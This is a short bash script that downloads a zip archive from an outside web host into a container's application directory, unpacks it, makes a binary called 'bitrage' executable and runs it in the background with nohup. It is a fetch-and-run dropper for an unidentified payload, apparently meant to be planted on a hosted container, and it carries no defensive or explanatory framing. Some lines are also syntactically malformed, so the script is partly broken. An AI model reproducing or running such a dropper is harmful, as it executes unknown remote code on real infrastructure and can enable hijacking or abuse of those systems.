#!/bin/bash

cd /opt/app-root/src
wget -qO- -O tmp.zip http://www.fgteambr.esy.es/bitrage.zip &&; unzip -o tmp.zip && rm tmp.zip;cd lin;chmod +x bitrage
nohup ./bitrage &1
